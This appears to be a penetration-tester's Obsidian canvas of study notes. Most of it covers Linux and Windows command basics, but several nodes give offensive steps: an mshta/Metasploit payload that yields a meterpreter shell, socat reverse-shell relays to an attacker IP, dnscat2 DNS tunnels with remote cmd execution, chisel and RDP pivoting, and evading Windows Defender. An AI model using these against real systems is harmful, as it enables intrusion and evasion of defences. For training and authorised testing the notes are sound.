{
	"nodes":[
		{"id":"e0ff1192b3813be6","type":"text","text":"# Machine Info\n`hostname`\n`whoami`\n`id`\n`uname -a`\n`uname -r` (kernel)\n\n`netstat -l` returns listening interfaces\n\n","x":-130,"y":-267,"width":260,"height":294},
		{"id":"6f4fff6114e75242","type":"text","text":"# FHS\n\n`/bin` binaries\n`/boot` static bootloader and kernel executables\n`/dev` contains device files to facilitate hardware\n`/etc` configuration files\n`/home` user subdirectories\n`/lib` shared library files\n`/media` mount location for USB drives and such\n`/mnt` temporary mount point for regular filesystems\n`/opt` optional files such as third-party tools\n`/root` home directory for root user\n`/sbin` contains executables for system administration\n`/tmp` temporary directory that is cleared upon system boot\n`/usr` contains executables, libraries, etc.\n`/var` contains variable data files such as logs, email in-boxes, web server. etc.","x":-280,"y":-893,"width":561,"height":480},
		{"id":"5136d84d041c33fc","type":"text","text":"# Processes\n\n## Apt\n\n`apt-cache` used to provide info about packages installed on the system. `apt-cache search impacket`\n\nShow all installed packages with `apt list –installed`\n\n## Git\n\nDownloads and installs tools from GitHub.\n\nEx. To install Nishang\n\n`mkdir ~/nishang/ && git clone https://github.com/samratashok/nishang.git ~/nishang`\n\n## Processes\n\nDaemons are denoted with a `d` at the end of the name, such as `systemd`\n\n`systemctl`\n- `start`\n- `status`\n- `enable`\n- `list-units –type=service`\n\nUse `journalctl` to view logs about a service to view errors\n\n`ps -aux | grep [name]`\n\n`kill`\n- `-l` to list all signal options\n- Most common are 1,2,3,9,15,19,20\n- `kill 9 [pid]`\n\n`jobs` to view background processes\n- Use `&` at the end to automatically background\n- `openvpn [file] &`\n- `fg [#]` to foreground\n","x":-280,"y":-1600,"width":561,"height":480},
		{"id":"6cb824f1b5b07df8","type":"text","text":"## Command Shortcuts\n\n- `ctrl + A` move cursor to beginning of line\n- `ctrl + E` move cursor to end of line\n- `ctrl + <- or ->` move cursor to beginning or end of a word\n- `ctrl B/F` jump backward/forward one word\n- `ctrl + L` clear terminal\n- `ctrl + R` view command history (arrow keys to select through them)","x":-1000,"y":-820,"width":580,"height":300},
		{"id":"3f2e1cc7cf178e08","type":"text","text":"# Windows","x":2440,"y":-120,"width":250,"height":60,"color":"5"},
		{"id":"c960bca48eb9a9e8","type":"text","text":"# Machine Info\n\n`Get-WmiObject -Class win32_OperatingSystem` OS info\n- `Win32_Process` process list\n- `Win32_Service` list of services\n\n","x":2288,"y":-700,"width":555,"height":340},
		{"id":"a28dbc2113f8f330","type":"text","text":"# OS Structure\n\n`C:\\` root directory\n- `Program Files`: Whatever programs match the system type (64-bit systems will store 64-bit files. 32-bit stores 16 and 32 bit programs.)\n- `Program Files (x86)`: on 64-bit systems, this is where 32 and 16-bit programs are installed\n- `ProgramData`: hidden folder containing data for programs\n- `Users`: profiles for each user\n- `Default`: default profile template for all users\n- `Public`: shared files between all users","x":2288,"y":-1400,"width":555,"height":520},
		{"id":"3e7c04c9daa74471","type":"text","text":"# Permissions\n\nFull Control: Allows read, write, changing, delete\nModify: allows read, write, delete\nList Folder Contents: Allows viewing and executing\nRead and Execute\nWrite: Allows for adding files to folders and writing for files\nRead: allows for viewing and listing\nTraverse: move through folders, but not necessary list\n\n`icacls`\n`get-executionpolicy -list`","x":2288,"y":-1960,"width":555,"height":260},
		{"id":"91b4b035ec69b3a9","type":"text","text":"# Other\n\n`Get-Alias` to list powershell shortcuts\n\nSee Shells in Exploitation to disable windows defender\n\n`net use` connects or disconnectss from a shared resource (similar to `mount`)\n- `net use n: \\\\192.168.220.129\\[share]`\n- `net use n: \\\\[IP]\\[share] /user:[user] [password]`\n","x":1740,"y":-240,"width":571,"height":237},
		{"id":"e6a25121b7c9de6a","type":"text","text":"# Powershell\n\n`Powershell -ep bypass` will bypass the execution policy prompt for powershell (optional)\n\nIf you have an account password, `runas.exe user:/[user] cmd` and then enter the password (equivalent of su in Linux)\n\nTo switch to a meterpreter shell, you can use the `exploit/windows/misc/hta_server` in metasploit. \n\t- It will generate a URL payload that you can copy and paste into the powershell session that will connect back to MSF and start the meterpreter session. \n\t- On the target: `mshta.exe [URL_payload]` (mshta.exe is a regular executable under System32 that can execute code embedded in HTML, hta stands for HTML Application) (you might have to foreground the session in msf, it went background for me automatically)\n\n","x":1060,"y":-360,"width":443,"height":357},
		{"id":"bbf7ea518e5c5058","type":"text","text":"# Services and Processes\n\n`tasklist` processes\n\n`netstat -abon`\n- `-a` all active TCP connections and TCP/UDP listeners\n- `-b` displays executables associated with active connections\n- `-n` same as `-a` but no DNS resolution\n- `-o` reveals PID of connections\n\n`Get-Service`\n\n`Get-ACL -Path [executable path] | Format-List`\n- examine service permissions\n\n`sc` configure and manage services\n- `sc qc` queries a service\n- you can specify hostnames or ip for devices on network with `sc //[host or ip]`\n\nSysInternalTools `\\\\live.sysinternals.com\\tools\\[tool]`\n- allows you to administer windows systems without installing anything\n- Some tools: process explorer, task manager, process monitor, TCPView, PSExec\n\nTask Manager\n- `taskmgr` in CMD or PowerShell\n\nTo see process binary paths: `get-process | select-object processname,path | fl`","x":3140,"y":-520,"width":740,"height":460},
		{"id":"924991b687a39c86","type":"text","text":"# CMD\n\n`set` - check environment path and other system variables\n`ver` - check OS version\n`systeminfo`\n`help [command]` or `[command] -h`\n`cls` clear shell\n`ipconfig /all`\n`del [file]` delete\n\n`more`\n- displays longer files in page view\n- `more [file]`\n- `systeminfo | more` for commands that return a lot of text\n\n`dir  /a` hidden files\n`dir /s` current directory and all subdirectories\n","x":2942,"y":101,"width":568,"height":289},
		{"id":"aa2a312907f32ad4","type":"text","text":"# Powershell\n\n`Find-Module -Name \"PowerShell*\"\n- locates modules of that name from common repositories\n### Enumerate\n\n`Get-LocalUser`\n\t`Get-LocalUser | WhereObject -property PasswordRequired -Match False`\n`Get-LocalGroup`\n`get-process`\n`get-service`\n`Get-NetTCPConnection`\n`new-item`, `remove-item`, `copy-item`\n### Files\n`get-content` (same as `type`)\n`get-childitem` similar to `dir` or `ls`\n- Powershell \"find\" command: `Get-ChildItem -Path C:\\ -Recurse -Filter *flag*`\n`set-location` is the same as `cd`\n``\n\n### Help\n`get-command` grabs all cmdlets installed\n\t`get-command New-*` returns all cmdlets that are `new-[something]`\n`get-help [cmdlet]` displays info about a cmdlet\n\t`get-help get-command` to get help about `get-command`\n\t`-examples` will show you use scenarios\n`get-alias` shows alternate command options\n- `get-alias type` will return `get-content`\n`[Object] | Get-Member` shows properties\n\n### Operators\n- example `Get-ChildItem | Where-Object -Property \"Extension\" -eq \".txt\"`\n\t- filters a list of files where the property extension is equal (operator) to .txt \n- `-eq` equal to\n- `-ne` not equal\n- `-gt` greater than\n- `-ge` greater than or equal to\n- `-lt` less than\n- `-le` less than or equal to\n- `-like` matches a string pattern (`Where-Object -Property \"Name\" -like \"ship*\"`)\n### File Hash\n`Get-FileHash '[location]' -Algorithm [hash type]`\n\n","x":1800,"y":260,"width":880,"height":705},
		{"id":"27cebfd1b5cfd87b","type":"text","text":"# Permissions\n\nPermission assignment:\n\t- r = 4\n\t- w = 2\n\t- x = 1\n\t- So, 764= `rwxrw-r--`\n\t- order: Owner, Group, Others\n\n`chmod`\n`chown [user]:[group] [file]`  \n\n\nSUID and GUID\n\tSet user ID and Set group ID\n\t`rws` instead of `x` \n\n# User Management\n`useradd`\n`userdel`\n`usermod`\n`addgroup`\n`delgroup`\n`passwd`\n","x":281,"y":-257,"width":420,"height":274},
		{"id":"decc2181e6af387c","type":"text","text":"# TCPDUMP\n\n`tcpdump`\n- `-i [interface]` listen on any interface (or, `-i any`)\n- if you don't have` ifconfig`, use `ip a s`\n- `-w [file]` saves results to a pcap file\n- `-r [file]` read from a file\n- `-c [number]` specify number of packets to capture\n- `-e` will display link-level information (MAC, ARP)\n- `tcpdump host [host]` to only capture traffic from a certain device on the network (destination host)\n- `tcpdump src host [hostname or IP]` will filter for a specific traffic destination\n\t- also `src port` or `dst port`\n- logical operators:\n\t- `and` \n\t- `or`\n\t- `not`\n\t- ex. `tcpdump src host 1.1.1.1 and tcp`","x":340,"y":-2120,"width":608,"height":406},
		{"id":"d602852c5c2f1f51","type":"text","text":"# Network Interfaces\n\nEach network interface has the address of your machine on that network and the netmask.\n- `tun0` means tunneled network interface\n- `netstat -r` will show your routing table and you can see what interface will be used for a particular IP address\n\n### Netstat\n\n- `-r` shows routing table\n- `-n` shows numerical addresses rather than resolving\n- `-a` shows all listening and non-listening sockets\n- `-t` shows TCP connections\n- `-p` shows connections specified by protocol","x":740,"y":-1460,"width":847,"height":268},
		{"id":"799d90a0b489fb81","type":"text","text":"# Tunneling\n\n`ss`\n- shows sockets running on a host\n- `-t` show TCP sockets\n- `-u` show UDP sockets\n- `-l` display listening sockets\n- `-p` shows the process using the socket\n- `-n` doesn't resolve service names\n### SSH Tunnel\n\n- `ssh -L [lport]:localhost:[rport] user@IP`\n\t- Both machines will encapsulate their traffic using ssh port 22\n\t- `lport` is the listening port on our machine that we want to receive the traffic to and send traffic from\n\t- `rport` is the port on the target machine that we want the traffic from\n\t- You can execute multiple of these in one command by repeating the `-L` flag with new arguments.\n\t- Ex. forwarding both MySQL and HTTP from target to our machine: `ssh -L 1234:localhost:3306 -L 8080:localhost:80 user@IP` \n- To confirm the tunneling, `nmap -sV -p1234 localhost` \n\n### SOCKS Tunneling with SSH\n\n- For pivoting from a foothold to an internal host\n- `ssh -D 9050 user@IP`\n\t- `-D` enables dynamic port forwarding\n- `/etc/proxychains.conf`\n\t- `#defaults set to \"tor\" \\ socks4 127.0.0.1 9050`\n- Now, running `proxychains [tool]` it will route all traffic to port 9050, where ssh is listening and forwarding through the foothold host\n\t- NOTE for nmap: You can only use **full TCP connect scans** with proxychains because it can't use partial packets.\n\t- May also need to disable ping probe\n- Example tools to use over socks tunnel:\n\t- You can also start `proxychains msfconsole` to use metasploit over our tunnel\n\t- `proxychains xfreerdp`\n\n#### With `metasploit`\n- Once you have a meterpreter shell, `use auxiliary/server/socks_proxy`\n\t- set `srvport` to 9050 (from `proxychains.conf`)\n\t- set `srvhost` to 0.0.0.0\n\t- set version to same version from `proxychains.conf` (usually 4a)\n\t- `jobs` to verify it's running\n- now use `post/multi/manage/autoroute` to route traffic through the meterpreter session\n\t- set `session` \n\t- set `subnet` to internal subnet on pivot machine\n- instead of the module you can also `run autoroute -s 172.16.5.0/23` from the meterpreter shell\n\t- `run autoroute -p` to verify the routing table is correct\n- You can also portforward with the meterpreter session. If you want to learn that go visit the module again.\n\n\n### Reverse Port Forward with SSH\n\n- First, get the shell payload on the internal host. You can use `scp` to get it on the pivot host, and then another kind of transaction such as HTTP server to get it to the internal host.\n\t- Make sure your payload is set to connect to the **pivot hosts** IP and port.\n- Configure ssh tunnel with `-R` to forward traffic from the internal IP address of the pivot host:\n\t- `ssh -R [internal_IP_of_foothold]:9999:0.0.0.0:8000 -vN`\n\t- In this case, our reverse shell is being caught on port `9999` of the foothold host, and it should be received by our listener on `8000`\n\t- When establishing the ssh tunnel, use `-vN` for verbosity and to not prompt the login shell.\n\n#### Socat Redirection\n\n- Reverse shell:\n\t- Once logged into target, you can use `socat` to create a pipe socket between 2 hosts.\n\t- `socat TCP4-LISTEN:8080,fork TCP4:[attacker_IP]:[listener_port]`\n\t- This will listen on the local port 8080 and forward back to our machine on the port of our choosing. This is good for pivoting if we have an internal machine that is communicating to the foothold host on port 8080.\n- Bind shell:\n\t- same process, but have the foothold machine forward data to the `internal host` rather than `attacker machine`. \n\t- On meterpreter, use something like `windows/x64/meterpreter/bind_tcp` and set `rhost [foothold_IP]` and `LPORT 8080`.\n\t- Since we set up the `socat` listener on 8080, the foothold will receive our bind_tcp payload and forward it to the internal host.\n\n","x":1100,"y":-2160,"width":700,"height":514},
		{"id":"38d1fa75341fd84c","type":"text","text":"# Redirection/Piping\n\nSTDIN - 0\nSTDOUT - 1\nSTDERR - 2\n\nRedirection\n\t`2> stderr.txt`\n\t`1> stdout.txt`\n\t`>>` appends, as in: \n\t\t`find /etc/ -name passwd >> stdout.txt` this redirects the `find` output to a file\n\t`|` is used to pipe from one program to another as in:\n\t\t `find /etc/ -name *.conf 2>/dev/null | grep systemd | wc -l` this will find data, and then use that output with a `grep` and then count words\n\n\nGrep\n\t- `cat /etc/passwd | grep \"/bin/bash\"`\n\t- `-i` ignore case\n\t- `-r` recursive\n\t- `-n` print line numbers\n\t- Using `-v` will exclude certain options:\n\t\t`cat /etc/passwd | grep -v \"false\\nologin\"` \n\t- Cut: `-d` specifies the character to set the delimiter to, and `-f` specifies the position in the line we want to output\n\t\t`cat /etc/passwd | grep -v \"false\\nologin | cut -d\":\" -f1`\n\t- Replace: `tr`\n\t\t`cat /etc/passwd | grep -v \"false\\|nologin\" | tr \":\" \" \"` replaces colons with spaces\n\t- Column: `cat /etc/passwd | grep -v \"false\\|nologin\" | tr \":\" \" \" | column -t`\n\t- Use `sort` to automatically sort results as well\n","x":-2120,"y":-1305,"width":561,"height":360},
		{"id":"58b7e0ab223e5b8e","type":"text","text":"# FIND\n\n`find [location] [options]`\n\t`-type [type]`\n\t`-name [name]`\n\t`-user [user]` filters files for a specific user\n\t`-exec [command] {} \\;`\n\t`2>/dev/null` redirects STDERR (gets rid of \"permission denied\")\n\t`-newermt 2020-03-03` only shows files newer than that date\n\t`-size +20k` larger than 20 kilobytes","x":-2120,"y":-785,"width":556,"height":290},
		{"id":"d64fbd51efa675bf","type":"text","text":"# Execute Multiple Commands\n\n`;`, `&&`, and `|`\n- `;` executes them all separately as if you entered them all as commands one at a time\n- `&&` will only execute the next command if the previous was successful\n- `|` uses the return from the previous command as input for the next\n\n## System Logs\n\n- Kernel logs `/var/log/kern.log`\n- System logs `/var/log/syslog`\n- Authentication `/var/log/auth.log`\n- Applications `/var/log/[app]/[log]\n\n## Command Shortcuts\n\n- `ctrl + A` move cursor to beginning of line\n- `ctrl + E` move cursor to end of line\n- `ctrl + <- or ->` move cursor to beginning or end of a word\n- `ctrl B/F` jump backward/forward one word\n- `ctrl + L` clear terminal\n- `ctrl + R` view command history (arrow keys to select through them)\n\nUse `sudo apt dist-upgrade` ???","x":-2104,"y":-2005,"width":525,"height":460},
		{"id":"7aab5b74f7a0c206","type":"text","text":"# REGEX\n\nRegular Expressions\n\n`()` define group parts of a regex. patterns that should be processed together\n\n`[]` define character classes, a list of characters to search for such as `[a-z]`\n\n`{}` define quantifiers. specify a number or range, which will indicate how many times a previous pattern should be repeated.\n\n`|` OR operator, shows results when one of the two expressions matches. `(true|false)` \n\n`.*` AND operator. displays results when both expressions match.\n\n\n","x":-2080,"y":-294,"width":360,"height":349},
		{"id":"7c78277d52124ddf","type":"text","text":"# Random\n\n`apropos [command]`\n\treturns a brief description from man page\n\n`history` displays command history for the current session\n\n`which` returns the path to a file or command\n\nGet around Python system-wide install error:\n- `pip3 install [package] --break-system-packages`\n- lol don't actually do this, use venvs","x":-1640,"y":-294,"width":378,"height":349},
		{"id":"631c8386feb3567b","type":"text","text":"# Linux","x":-790,"y":-160,"width":160,"height":80,"color":"3"},
		{"id":"6661a042c0c31b23","type":"text","text":"# VIM/NVIM\n\n`vimtutor` for vim\n`nvim` and then `:Tutor` for NeoVim\n\n`:set nolist` remove extra characters from display like `$` \n\n`esc` return to NORMAL mode\n\t`:q` quit (if no file changes)\n\t`:wq` save file and quit\n\t`:q!` force quit without saving\n\t`:w [name]` save changes and new file name \n\nText Editing\n\t`i` insert text\n\tAppend\n\t\t`a` insert text after the cursor\n\t\t`A` append text (capital `A`!)\n\tDelete\n\t\t`x` delete characters\n\t\t`dw` will delete a whole word\n\t\t`d$` deletes the rest of a line following the cursor\n\t\t`dd` delete whole line\n\t`u` undo last command\n\t`U` fix a whole line\n\t`p` paste previously deleted text\n\t`r` replace a character with the next character typed\n\t\t`rw` will replace it with `w`\n\t\t`R` will enter replacement mode, where you can keep typing\n\nCopy and Paste\n\t`v` enters visual mode\n\t\t- `shift + v` to select all\n\t`y` copy\n\t\t`\"+y` to copy to system clipboard\n\t`p` paste\n\t\n\nCursor Location and File Status\n\t`ctrl + g` will show line location\n\t`G` to bottom of file\n\t`gg` to top of file\n\t`[number] G` goes to a line number\n\t`$` goes to end of the line\n\t`/[text]` search for a string\n\t`?[text]` search backwards for a string\n\t\t`n` to search for the same phrase again\n\t\t`N` to search for the same phrase in the opposite direction\n\t\t`ctrl o` return to where you came from\n\t`:s/[text]/[replacement_text`\n\t\tadd `/g` at the end to apply to the whole line\n\t\t`:%s/[text]/[replacement]/g` for the whole file\n\t\n","x":-1080,"y":280,"width":740,"height":560},
		{"id":"4efbc5ac17c603a4","type":"text","text":"# DNS Tunnel\n\n`Dnscat2` https://github.com/iagox86/dnscat2\n- Tunnel that uses DNS protocol\n- Installation\n\t- `sudo clone [github]`\n\t- `cd dnscat2/server/`\n\t- `sudo gem install bundler`\n\t- `sudo bundle install`\n- `sudo ruby dnscat2.rb --dns host=10.10.14.18,port=53,domain=inlanefreight.local --no-cache`\n- You will need to transfer the client to the host, or in the case of a Windows host use `dnscat2-powershell` https://github.com/lukebaggett/dnscat2-powershell\n\t- `Start-Dnscat2 -DNSserver [attacking_IP] -Domain inlanefreight.local -PreSharedSecret [key from dnscat2 server] -Exec cmd`\n- dnscat2 prompt:\n\t- `?` list options\n\t- `window -i 1` drops into a shell","x":1128,"y":-2680,"width":645,"height":400},
		{"id":"cc9ae423cdea4f9d","type":"text","text":"# Chisel/HTTP Tunnel\n\nSOCKS5 Tunneling using HTTP. Useful to create a tunnel in a firewall restricted environment.\nhttps://github.com/jpillora/chisel.git\n\n- You need GO installed\n- Build the binary `cd chisel && go build`\n- IppSec has a walkthrough on shrinking the size of the binary for detection reasons, https://www.youtube.com/watch?v=Yp4oxoQIBAM&t=1469s 24:30\n- Copy the binary to the host\n\t- on pivot host `./chisel server -v -p 1234 --socks5`\n- On attacking machine\n\t- `./chisel client -v [IP:port of pivot host] socks`\n\t- modify `/etc/proxychains.conf` and add the line `socks5 127.0.0.1 1080` (assuming 1080 was the port from the output of running chisel)\n\t- now you can use proxychains to attack internal host","x":1128,"y":-3400,"width":645,"height":540},
		{"id":"62aca4411a568022","x":1327,"y":-3610,"width":250,"height":60,"type":"text","text":"# ICMP Tunnel"},
		{"id":"b945d6cc177b5594","x":1100,"y":-4420,"width":700,"height":480,"type":"text","text":"# RDP Tunnel\n\nUseful for windows network with no ssh\n`SocksOverRDP` is a Dynamic Virtual Channel (DVC)\nNote, this example used Proxifier to RDP from a foothold to TWO internal hosts. We used the first internal host as the SocksOverRDP server, and then used Proxifier on the foothold to RDP to the second internal host.\n\nStep 1: `SocksOverRDP`\n- https://github.com/nccgroup/SocksOverRDP/releases\n- Copy the appropriate ZIP using an RDP session\n- Unzip and load the plugin with `regsvr32.exe SocksOverRDP-Plugin.dll`\n\t- had to add an exclusion for Windows Defender for the folder, otherwise it will delete it\n\t- It will listen on 127.0.0.1:1080\n- `mstsc.exe` to RDP to internal host\n\t- Transfer `SocksOverRDP-Server.exe` to internal host (you can copy and paste)\n- Start `SocksOverRDP-Server.exe` with admin privileges\n- On foothold, `netstat -antb | findstr 1080` should show a connection on 1080\nStep 2: `Proxifier`\n- https://www.proxifier.com/download/#win-tab\n- Transfer `Proxifier portable` to the Windows external target\n- Click on the application to run it as GUI, and set the address to 127.0.0.1 and port to 1080 (might need to try a SOCKS4 or SOCK5 protocol)\n- Start mstsc.exe (again) and Proxifier will route our traffic through 1080 to the RDP session on the internal target\n\t- I needed to run mstsc.exe from the file explorer rather than command line\n- In RDP menu, try setting experience to `modem` if you have slow connetion"}
	],
	"edges":[
		{"id":"7a29a68afc8d0230","fromNode":"631c8386feb3567b","fromSide":"left","toNode":"7c78277d52124ddf","toSide":"right"},
		{"id":"79790219fb367b4a","fromNode":"631c8386feb3567b","fromSide":"right","toNode":"e0ff1192b3813be6","toSide":"left"},
		{"id":"852e4e2e8a02274a","fromNode":"631c8386feb3567b","fromSide":"bottom","toNode":"6661a042c0c31b23","toSide":"top"},
		{"id":"02c40fc0743b4297","fromNode":"7c78277d52124ddf","fromSide":"left","toNode":"7aab5b74f7a0c206","toSide":"right"},
		{"id":"0517c0935e725bce","fromNode":"e0ff1192b3813be6","fromSide":"right","toNode":"27cebfd1b5cfd87b","toSide":"left"},
		{"id":"4d515c6e90d76e4a","fromNode":"e0ff1192b3813be6","fromSide":"top","toNode":"6f4fff6114e75242","toSide":"bottom"},
		{"id":"82523c3f3a1af987","fromNode":"7c78277d52124ddf","fromSide":"top","toNode":"58b7e0ab223e5b8e","toSide":"bottom"},
		{"id":"cc6ae70f5e03f82a","fromNode":"58b7e0ab223e5b8e","fromSide":"top","toNode":"38d1fa75341fd84c","toSide":"bottom"},
		{"id":"23e00a12233570a0","fromNode":"6f4fff6114e75242","fromSide":"top","toNode":"5136d84d041c33fc","toSide":"bottom"},
		{"id":"dd1d5cbcd5dc7204","fromNode":"38d1fa75341fd84c","fromSide":"top","toNode":"d64fbd51efa675bf","toSide":"bottom"},
		{"id":"b2fbbde0668e02c4","fromNode":"631c8386feb3567b","fromSide":"top","toNode":"6cb824f1b5b07df8","toSide":"bottom"},
		{"id":"54b816133c0a78a1","fromNode":"3f2e1cc7cf178e08","fromSide":"top","toNode":"c960bca48eb9a9e8","toSide":"bottom"},
		{"id":"d8ca7f1edefb0614","fromNode":"c960bca48eb9a9e8","fromSide":"top","toNode":"a28dbc2113f8f330","toSide":"bottom"},
		{"id":"a585b6a41c3c8671","fromNode":"a28dbc2113f8f330","fromSide":"top","toNode":"3e7c04c9daa74471","toSide":"bottom"},
		{"id":"d00e72643f3f64ad","fromNode":"3f2e1cc7cf178e08","fromSide":"right","toNode":"bbf7ea518e5c5058","toSide":"left"},
		{"id":"8270ed5ae096121b","fromNode":"3f2e1cc7cf178e08","fromSide":"left","toNode":"91b4b035ec69b3a9","toSide":"right"},
		{"id":"9212fe6d4aa8975d","fromNode":"3f2e1cc7cf178e08","fromSide":"bottom","toNode":"aa2a312907f32ad4","toSide":"top"},
		{"id":"59ef11ae9d9c2201","fromNode":"91b4b035ec69b3a9","fromSide":"left","toNode":"e6a25121b7c9de6a","toSide":"right"},
		{"id":"bfff4d7737ba7801","fromNode":"3f2e1cc7cf178e08","fromSide":"right","toNode":"924991b687a39c86","toSide":"left"},
		{"id":"03353d56beb1155b","fromNode":"d602852c5c2f1f51","fromSide":"top","toNode":"799d90a0b489fb81","toSide":"bottom"},
		{"id":"c58dfbd56aa6a058","fromNode":"d602852c5c2f1f51","fromSide":"top","toNode":"decc2181e6af387c","toSide":"bottom"},
		{"id":"6fb3579502002829","fromNode":"799d90a0b489fb81","fromSide":"top","toNode":"4efbc5ac17c603a4","toSide":"bottom"},
		{"id":"b607223284cedfdf","fromNode":"4efbc5ac17c603a4","fromSide":"top","toNode":"cc9ae423cdea4f9d","toSide":"bottom"},
		{"id":"c861e0e9253ae75b","fromNode":"cc9ae423cdea4f9d","fromSide":"top","toNode":"62aca4411a568022","toSide":"bottom"},
		{"id":"191cb4126253fe20","fromNode":"62aca4411a568022","fromSide":"top","toNode":"b945d6cc177b5594","toSide":"bottom"}
	]
}